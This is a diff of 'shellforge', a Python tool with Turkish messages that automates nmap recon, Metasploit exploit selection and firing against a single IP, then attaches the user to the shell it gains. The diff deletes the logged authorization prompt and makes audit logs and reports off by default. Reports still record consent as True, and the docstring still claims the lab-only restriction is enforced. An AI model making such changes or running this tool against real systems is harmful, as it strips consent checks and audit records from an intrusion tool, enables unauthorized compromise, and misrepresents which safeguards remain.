@@ -2,13 +2,11 @@
 """shellforge -- autonomous lab-only exploitation pipeline.
 
 Given a SINGLE target IP, shellforge runs recon -> match -> dry-run -> fire ->
-verify -> report, driving tools that are already installed on Kali (nmap,
-searchsploit, Metasploit via msfrpc).
+verify, and on success drops the user straight into the obtained session.
 
-AUTHORIZED LAB USE ONLY. shellforge enforces this at the tool level:
+AUTHORIZED LAB USE ONLY. shellforge keeps this at the tool level:
 
 * exactly one IP address (no CIDR, ranges, lists or input files),
-* an explicit interactive authorization prompt that is logged,
 * no hardcoded targets and no internet-facing scan mode,
 * Ctrl+C stops immediately and cleans up sessions it opened.
 """
@@ -27,6 +25,7 @@ import yaml
 
 from core import executor as execmod
 from core import matcher, recon, reporter
+from core.colors import err, info, ok, paint, warn
 
 LOG = logging.getLogger("shellforge")
 
@@ -39,20 +38,43 @@ BANNER = r"""
 """
 
 
-def setup_logging(target: str, reports_dir: Path) -> None:
-    """Configure logging to both stdout and a per-run logfile."""
-    reports_dir.mkdir(parents=True, exist_ok=True)
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    logfile = reports_dir / f"shellforge_{target.replace(':', '_')}_{ts}.log"
-    logging.basicConfig(
-        level=logging.INFO,
-        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
-        handlers=[
-            logging.StreamHandler(sys.stdout),
-            logging.FileHandler(logfile, encoding="utf-8"),
-        ],
-    )
-    LOG.info("Günlük dosyası: %s", logfile)
+class _ColorLogFormatter(logging.Formatter):
+    """Logging formatter that colours console lines by severity."""
+
+    _LEVEL = {
+        logging.DEBUG: "dim",
+        logging.INFO: "info",
+        logging.WARNING: "warn",
+        logging.ERROR: "err",
+        logging.CRITICAL: "err",
+    }
+
+    def format(self, record: logging.LogRecord) -> str:
+        msg = super().format(record)
+        kind = self._LEVEL.get(record.levelno)
+        return paint(kind, msg) if kind else msg
+
+
+def setup_logging(target: str, reports_dir: Path, to_file: bool) -> Path | None:
+    """Configure console logging (coloured); add a logfile only when requested."""
+    fmt = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
+    stream = logging.StreamHandler(sys.stdout)
+    stream.setFormatter(_ColorLogFormatter(fmt))
+    handlers: list[logging.Handler] = [stream]
+
+    logfile: Path | None = None
+    if to_file:
+        reports_dir.mkdir(parents=True, exist_ok=True)
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        logfile = reports_dir / f"shellforge_{target.replace(':', '_')}_{ts}.log"
+        fh = logging.FileHandler(logfile, encoding="utf-8")
+        fh.setFormatter(logging.Formatter(fmt))  # plain text in the logfile
+        handlers.append(fh)
+
+    logging.basicConfig(level=logging.INFO, handlers=handlers)
+    if logfile:
+        LOG.info("Günlük dosyası: %s", logfile)
+    return logfile
 
 
 def validate_single_ip(value: str) -> str:
@@ -87,14 +109,14 @@ def prompt_for_target() -> str | None:
     print("Otonom lab exploit zinciri. Tek hedef, yalnızca yetkili lab.\n")
     try:
         while True:
-            raw = input("[?] Kurban IP (tek adres): ").strip()
+            raw = input(info("[?] Kurban IP (tek adres): ")).strip()
             if not raw:
                 print("    (Boş. Çıkmak için Ctrl+C.)")
                 continue
             try:
                 return validate_single_ip(raw)
             except argparse.ArgumentTypeError as exc:
-                print(f"    [!] {exc}\n")
+                print(err(f"    [!] {exc}\n"))
     except (EOFError, KeyboardInterrupt):
         print()
         return None
@@ -105,32 +127,13 @@ def load_config(path: str | Path) -> dict:
     p = Path(path)
     if not p.exists():
         print(
-            f"[!] Yapılandırma dosyası '{p}' bulunamadı. Önce şablonu kopyala:\n"
-            f"      cp config.yaml.example {p}\n",
+            err(f"[!] Yapılandırma dosyası '{p}' bulunamadı. Önce şablonu kopyala:")
+            + f"\n      cp config.yaml.example {p}\n",
             file=sys.stderr,
         )
         sys.exit(2)
     with p.open("r", encoding="utf-8") as fh:
         return yaml.safe_load(fh) or {}
-
-
-def confirm_authorization(target: str, assume_yes: bool = False) -> bool:
-    """Interactive authorization gate. Returns True only on explicit 'y'."""
-    question = (
-        f"\n[?] {target} sana ait VEYA test için YAZILI iznin olan bir lab mı? [e/H] "
-    )
-    if assume_yes:
-        LOG.warning("Yetki --yes ile otomatik onaylandı, hedef %s", target)
-        print(question + "e (--yes ile)")
-        return True
-    try:
-        answer = input(question).strip().lower()
-    except (EOFError, KeyboardInterrupt):
-        print()
-        return False
-    granted = answer in ("e", "evet", "y", "yes")
-    LOG.info("Yetki onayı %s -> %s", target, "ONAYLANDI" if granted else "REDDEDİLDİ")
-    return granted
 
 
 def detect_lhost(target: str) -> str:
@@ -163,6 +166,45 @@ def _stop_proc(proc) -> None:
             pass
 
 
+def _launch_window_attach(msf_cfg: dict, sid: int) -> bool:
+    """Open a new gnome-terminal window that attaches to session ``sid``.
+
+    Returns True if the window was launched, False if gnome-terminal is not
+    available (caller then falls back to in-process attach).
+    """
+    import shutil
+    import subprocess
+
+    term = shutil.which("gnome-terminal")
+    if term is None:
+        return False
+
+    script = Path(__file__).resolve().parent / "attach.py"
+    cmd = [
+        "python3", str(script),
+        "--sid", str(sid),
+        "--host", str(msf_cfg.get("host", "127.0.0.1")),
+        "--port", str(msf_cfg.get("port", 55553)),
+        "--user", str(msf_cfg.get("user", "msf")),
+        "--password", str(msf_cfg.get("password", "msf")),
+    ]
+    if not bool(msf_cfg.get("ssl", True)):
+        cmd.append("--no-ssl")
+    try:
+        subprocess.Popen([term, "--", *cmd])
+        return True
+    except Exception:  # noqa: BLE001
+        return False
+
+
+def _write_report(target, recon_result, matches, attempts, reports_dir) -> tuple[str, str]:
+    """Build and write JSON + Markdown reports; return the two paths."""
+    if recon_result is None:
+        return "", ""
+    report = reporter.build_report(target, True, recon_result, matches, attempts)
+    return reporter.write_reports(report, reports_dir)
+
+
 def main(argv: list[str] | None = None) -> int:
     parser = argparse.ArgumentParser(
         prog="shellforge",
@@ -181,10 +223,16 @@ def main(argv: list[str] | None = None) -> int:
         help="Path to the YAML config file (default: config.yaml).",
     )
     parser.add_argument(
-        "--yes",
+        "--rapor",
         action="store_true",
-        help="Pre-confirm the authorization prompt (for unattended lab runs). "
-        "The confirmation is still logged.",
+        help="Write JSON report + logfile (and raw nmap XML) to reports/. "
+        "Off by default.",
+    )
+    parser.add_argument(
+        "--pencere",
+        action="store_true",
+        help="On success, open the interactive session attach in a new "
+        "gnome-terminal window instead of the current one.",
     )
     args = parser.parse_args(argv)
 
@@ -199,13 +247,14 @@ def main(argv: list[str] | None = None) -> int:
     else:
         resolved = prompt_for_target()
         if resolved is None:
-            print("[!] Hedef girilmedi. Çıkılıyor.")
+            print(err("[!] Hedef girilmedi. Çıkılıyor."))
             return 1
+
         args.target = resolved
 
     config = load_config(args.config)
     reports_dir = Path("reports")
-    setup_logging(args.target, reports_dir)
+    setup_logging(args.target, reports_dir, to_file=args.rapor)
 
     LOG.info("Hedef: %s", args.target)
 
@@ -216,20 +265,14 @@ def main(argv: list[str] | None = None) -> int:
         detected = detect_lhost(args.target)
         handler["lhost"] = detected
         LOG.info("LHOST otomatik belirlendi: %s", detected)
-        print(f"[*] LHOST otomatik belirlendi: {detected}")
-
-    # --- Authorization gate -------------------------------------------------
-    if not confirm_authorization(args.target, assume_yes=args.yes):
-        LOG.warning("Yetki verilmedi. Tarama yapılmadan çıkılıyor.")
-        print("[!] Yetki verilmedi. Hiçbir şey taranmadı. Çıkılıyor.")
-        return 1
+        print(info(f"[*] LHOST otomatik belirlendi: {detected}"))
 
     the_executor: execmod.Executor | None = None
     msf_proc = None  # msfrpcd process if shellforge started it
 
     def handle_sigint(signum, frame):  # noqa: ANN001 - signal handler signature
         LOG.warning("Ctrl+C alındı -- durduruluyor ve temizleniyor.")
-        print("\n[!] Kesildi. shellforge'un açtığı oturumlar temizleniyor...")
+        print(err("\n[!] Kesildi. shellforge'un açtığı oturumlar temizleniyor..."))
         if the_executor is not None:
             the_executor.cleanup()
         if msf_proc is not None:
@@ -250,16 +293,18 @@ def main(argv: list[str] | None = None) -> int:
             nmap_arguments=recon_cfg.get("nmap_arguments", "-sV -Pn"),
             timeout=int(recon_cfg.get("timeout", 300)),
             reports_dir=reports_dir,
+            save_xml=args.rapor,
         )
         open_services = recon_result.open_services()
         if not open_services:
-            print("[!] Açık servis bulunamadı. Yapılacak bir şey yok.")
-            _finalize(args.target, True, recon_result, matches, attempts, reports_dir)
+            print(warn("[!] Açık servis bulunamadı. Yapılacak bir şey yok."))
+            if args.rapor:
+                _write_report(args.target, recon_result, matches, attempts, reports_dir)
             return 0
 
         # --- 2. CONNECT (auto-start msfrpcd if needed) + MATCH -------------
         msf_cfg = config.get("msfrpc", {})
-        print("[*] Metasploit RPC'ye bağlanılıyor (çalışmıyorsa otomatik başlatılır)...")
+        print(info("[*] Metasploit RPC'ye bağlanılıyor (çalışmıyorsa otomatik başlatılır)..."))
         client, msf_proc = execmod.connect_or_start(
             host=msf_cfg.get("host", "127.0.0.1"),
             port=int(msf_cfg.get("port", 55553)),
@@ -268,7 +313,7 @@ def main(argv: list[str] | None = None) -> int:
             ssl=bool(msf_cfg.get("ssl", True)),
         )
         if msf_proc is not None:
-            print(f"[*] msfrpcd otomatik başlatıldı (PID {msf_proc.pid}).")
+            print(info(f"[*] msfrpcd otomatik başlatıldı (PID {msf_proc.pid})."))
 
         matches = matcher.match_services(
             open_services,
@@ -277,62 +322,71 @@ def main(argv: list[str] | None = None) -> int:
         )
         candidates = matcher.flatten_candidates(matches)
         if not candidates:
-            print("[!] Denenebilir Metasploit adayı bulunamadı. Exploit-DB eşleşmeleri için rapora bak.")
-            _finalize(args.target, True, recon_result, matches, attempts, reports_dir)
+            print(warn("[!] Denenebilir Metasploit adayı bulunamadı."))
+            if args.rapor:
+                _write_report(args.target, recon_result, matches, attempts, reports_dir)
             if msf_proc is not None:
                 _stop_proc(msf_proc)
             return 0
 
-        print(f"[*] {len(candidates)} aday modül sıraya alındı (en güvenilir önce).")
+        print(info(f"[*] {len(candidates)} aday modül sıraya alındı (en güvenilir önce)."))
 
         # --- 3-5. DRY-RUN + FIRE + VERIFY ----------------------------------
         the_executor = execmod.Executor(client, args.target, config)
         attempts = the_executor.run(candidates)
 
+        # --- 6. SHELL DELIVERY ---------------------------------------------
+        success = next((a for a in attempts if getattr(a, "success", False)), None)
+        if success is not None:
+            sid = success.session_id
+            print(ok(f"\n[+] SHELL ALINDI! Oturum {sid} ({success.session_type or '?'})."))
+            if args.pencere:
+                if _launch_window_attach(msf_cfg, sid):
+                    print(info("[*] Oturum yeni bir gnome-terminal penceresinde açıldı."))
+                else:
+                    print(warn("[*] gnome-terminal yok; bu pencerede bağlanılıyor."))
+                    the_executor.interact(sid)
+            else:
+                the_executor.interact(sid)
+        else:
+            print(warn("\n[-] Shell alınamadı. Tüm adaylar denendi."))
+
     except execmod.MsfConnectionError as exc:
         LOG.error("%s", exc)
-        print(f"\n[!] {exc}")
-        _finalize(args.target, True, recon_result, matches, attempts, reports_dir)
+        print(err(f"\n[!] {exc}"))
+        if args.rapor:
+            _write_report(args.target, recon_result, matches, attempts, reports_dir)
         return 3
     except Exception as exc:  # noqa: BLE001 - top-level guard
         LOG.exception("Beklenmeyen hata: %s", exc)
-        print(f"[!] Beklenmeyen hata: {exc}")
-        _finalize(args.target, True, recon_result, matches, attempts, reports_dir)
+        print(err(f"[!] Beklenmeyen hata: {exc}"))
+        if args.rapor:
+            _write_report(args.target, recon_result, matches, attempts, reports_dir)
         if msf_proc is not None:
             _stop_proc(msf_proc)
         return 1
 
-    # --- 6. REPORT ----------------------------------------------------------
-    json_path, md_path = _finalize(args.target, True, recon_result, matches, attempts, reports_dir)
-
     succeeded = any(getattr(a, "success", False) for a in attempts)
-    if succeeded:
-        print("\n[+] SHELL ALINDI! Oturum detayları ve kanıt için rapora bak.")
-    else:
-        print("\n[-] Shell alınamadı. Tüm adaylar denendi.")
-    print(f"[*] JSON rapor: {json_path}")
-    print(f"[*] MD rapor:   {md_path}")
+
+    # Optional report (off by default).
+    if args.rapor:
+        json_path, md_path = _write_report(
+            args.target, recon_result, matches, attempts, reports_dir
+        )
+        print(info(f"[*] JSON rapor: {json_path}"))
+        print(info(f"[*] MD rapor:   {md_path}"))
 
     # If shellforge started msfrpcd: keep it alive when a session landed so the
-    # shell survives; otherwise shut it back down to avoid leaving a daemon.
+    # shell survives (per design); otherwise shut it back down.
     if msf_proc is not None:
         if succeeded:
-            print(f"[*] msfrpcd açık bırakıldı (PID {msf_proc.pid}) — oturum yaşasın diye.")
-            print(f"    Oturuma bağlanmak için: msfconsole -> sessions -i <id>")
-            print(f"    msfrpcd'yi durdurmak için: kill {msf_proc.pid}")
+            print(info(f"[*] msfrpcd açık bırakıldı (PID {msf_proc.pid}) — oturum canlı."))
+            print(info(f"    Durdurmak için: kill {msf_proc.pid}"))
         else:
             _stop_proc(msf_proc)
-            print("[*] Otomatik başlatılan msfrpcd kapatıldı.")
+            print(info("[*] Otomatik başlatılan msfrpcd kapatıldı."))
 
     return 0 if succeeded else 4
-
-
-def _finalize(target, consent, recon_result, matches, attempts, reports_dir):
-    """Build and write reports; return the two paths (or empty strings)."""
-    if recon_result is None:
-        return "", ""
-    report = reporter.build_report(target, consent, recon_result, matches, attempts)
-    return reporter.write_reports(report, reports_dir)
 
 
 if __name__ == "__main__":
